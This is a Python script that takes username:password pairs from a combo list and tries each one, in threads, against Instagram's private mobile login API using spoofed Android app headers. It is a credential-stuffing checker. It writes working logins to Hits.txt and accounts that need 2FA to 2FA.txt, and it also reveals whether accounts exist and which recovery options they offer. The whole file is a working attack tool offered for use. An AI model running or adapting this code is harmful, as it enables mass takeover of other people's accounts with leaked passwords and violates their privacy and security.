import requests
import time
from uuid import uuid4
import threading
import os
import json


def login(user, pas):
    url = "https://i.instagram.com/api/v1/accounts/login/"
    
    data = {
        'signed_body': "SIGNATURE.{\"enc_password\":\"#PWD_INSTAGRAM:0:" + str(int(time.time())) + ":" + pas + "\",\"username\":\"" + user + "\",\"adid\":\"\",\"guid\":\"" + str(uuid4()) + "\",\"device_id\":\"android-" + str(uuid4())[:16] + "\",\"google_tokens\":\"[]\",\"login_attempt_count\":\"0\"}"
    }
    
    headers = {
        'User-Agent': "Instagram 237.0.0.14.102 Android (30/11; 440dpi; 1080x2220; Xiaomi/Redmi; Redmi Note 8 Pro; begonia; mt6785; en_US; 373310554)", 
        'x-bloks-version-id': "8dab28e76d3286a104a7f1c9e0c632386603a488cf584c9b49161c2f5182fe07",
        'x-ig-app-id': "567067343352427",
        'priority': "u=3",
        'accept-language': "en-US",
    }
    
    response = requests.post(url, data=data, headers=headers)
    response_json = json.loads(response.text)

    if 'logged_in_user' in response_json:
        print(f"Hit !!! /// {user}:{pas}")
        with open("Hits.txt", "a") as hits_file:
            hits_file.write(f"{user}:{pas}\n")
        
    elif response_json.get('error_title') == "Can't find account":
        print(f"Email Doesn't Exist {user}:{pas}")

    elif response_json.get('error_title') == "Forgotten password":
        if "Send email" in [button['title'] for button in response_json.get('buttons', [])]:
            print(f"Password recovery (Send email) for {user}:{pas}")
        elif "Use Facebook" in [button['title'] for button in response_json.get('buttons', [])]:
            print(f"Password recovery via Facebook for {user}:{pas}")
        else:
            print(f"Password recovery option is unknown for {user}:{pas}")

    elif response_json.get('error_type') == "bad_password":
        print(f"The password you entered is incorrect. Please try again. {user}:{pas}")

    elif response_json.get('invalid_credentials') == True:
        print(f"Invalid credentials for {user}:{pas}")

    elif response_json.get("checkpoint_challenge_required") == True:
        print(f"2FA required for {user}:{pas}")
        with open("2FA.txt", "a") as twofa_file:
            twofa_file.write(f"{user}:{pas}\n")
    elif response_json.get("We can send you an email to help you get back into your account."):
        print(f"We can send you an email to help you get back into your account. {user}:{pas}")

    else:
        print(f"Unexpected response for {user}:{pas}")

def start_login_threads():
    threads = []
    max_threads = 5  
    with open("combo.txt", "r") as combo_file:
        for line in combo_file:
            if ':' in line:
                user, pas = line.strip().split(':', 1)
                thread = threading.Thread(target=login, args=(user, pas))
                threads.append(thread)
                thread.start()
                
                if len(threads) >= max_threads:
                    for t in threads:
                        t.join()  
                    threads = [] 

    for t in threads:
        t.join()

start_login_threads()
